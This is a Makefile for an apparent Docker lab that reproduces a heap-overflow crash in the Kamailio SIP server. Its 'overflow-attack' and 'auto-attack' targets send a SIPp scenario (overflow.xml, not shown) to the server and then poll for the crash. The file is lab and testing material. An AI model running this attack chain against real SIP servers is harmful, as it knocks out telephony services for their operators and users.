DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")
STACK_ID := 3_heap_overflow_kamailio
CHECK_AVAILABLE_TAG := RTC_CHECK_AVAILABLE
DRY_RUN_TAG := RTC_DRY_RUN

SERVICE ?= 
TARGET_IP ?= 10.13.0.5
KAMAILIO_PORT ?= 5060
ATTACK_TIMEOUT_SEC ?= 30
ATTACK_POLL_SEC ?= 1

run:
	@$(DOCKER_COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(DOCKER_COMPOSE) down --remove-orphans

start-attacks:
	@docker exec -it sipp101 bash

build: 
	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)
rebuild:
	@$(DOCKER_COMPOSE) down --rmi all --remove-orphans || true
	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)

is-available:
	@echo "$(CHECK_AVAILABLE_TAG)_BEGIN stack=$(STACK_ID)"
	@$(DOCKER_COMPOSE) config -q
	@SERVICES="$$( $(DOCKER_COMPOSE) config --services )"; \
	if [ -z "$$SERVICES" ]; then \
		echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) reason=no_services"; \
		exit 1; \
	fi; \
	for SVC in $$SERVICES; do \
		CID="$$( $(DOCKER_COMPOSE) ps -q $$SVC )"; \
		if [ -z "$$CID" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=not_running"; \
			exit 1; \
		fi; \
		STATE="$$(docker inspect -f '{{.State.Status}}' $$CID)"; \
		if [ "$$STATE" != "running" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=unexpected_state state=$$STATE"; \
			exit 1; \
		fi; \
		echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) service=$$SVC state=$$STATE"; \
	done; \
	echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) all_services=running"

dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@docker exec sipp101 sh -lc "test -f /sipp/xml/registration101.xml && test -f /sipp/xml/overflow.xml" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=sipp_assets reason=missing_files"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=sipp_assets"
	@docker exec sipp101 sipp -sf /sipp/xml/registration101.xml "$(TARGET_IP):$(KAMAILIO_PORT)" -m 1 >/tmp/kamailio-dry-run.log 2>&1 || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=kamailio_registration reason=sipp_failed"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=kamailio_registration"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

overflow-attack:
	@IP="$(TARGET_IP)"; \
	if [ -z "$$IP" ]; then \
		IP=$$(docker inspect kamailio --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null || true); \
	fi; \
	if [ -z "$$IP" ]; then \
		echo "[!] Unable to resolve target IP. Set TARGET_IP explicitly."; \
		exit 1; \
	fi; \
	echo "[*] Launching overflow attack against $$IP:$(KAMAILIO_PORT)..."; \
	docker exec sipp101 sipp -sf /sipp/xml/overflow.xml "$$IP:$(KAMAILIO_PORT)" -m 1

kamailio-status:
	@docker ps -a --filter name=kamailio --format 'table {{.Names}}\t{{.Status}}'

check-kamailio-running:
	@STATUS=$$(docker inspect -f '{{.State.Status}}' kamailio 2>/dev/null || echo "not_found"); \
	if [ "$$STATUS" != "running" ]; then \
		echo "[!] Pre-check failed: kamailio status is '$$STATUS' before attack."; \
		echo "[i] Check with: make kamailio-status"; \
		echo "[i] Last kamailio logs:"; \
		docker logs --tail 20 kamailio 2>/dev/null || true; \
		exit 1; \
	fi

check-crash:
	@echo "[*] Waiting for kamailio crash (timeout: $(ATTACK_TIMEOUT_SEC)s)..."
	@i=0; \
	limit=$$(( $(ATTACK_TIMEOUT_SEC) / $(ATTACK_POLL_SEC) )); \
	while [ $$i -le $$limit ]; do \
		STATUS=$$(docker inspect -f '{{.State.Status}}' kamailio 2>/dev/null || echo "not_found"); \
		if [ "$$STATUS" != "running" ]; then \
			echo "[+] Attack success: kamailio status is '$$STATUS'."; \
			exit 0; \
		fi; \
		sleep $(ATTACK_POLL_SEC); \
		i=$$((i+1)); \
	done; \
	echo "[!] Attack check timed out: kamailio is still running."; \
	exit 1

auto-attack: stop build start
	@echo "[*] Waiting for containers (3 seconds)..."
	@sleep 3
	@$(MAKE) check-kamailio-running
	@$(MAKE) overflow-attack TARGET_IP="$(TARGET_IP)" KAMAILIO_PORT="$(KAMAILIO_PORT)"
	@$(MAKE) check-crash ATTACK_TIMEOUT_SEC="$(ATTACK_TIMEOUT_SEC)" ATTACK_POLL_SEC="$(ATTACK_POLL_SEC)"
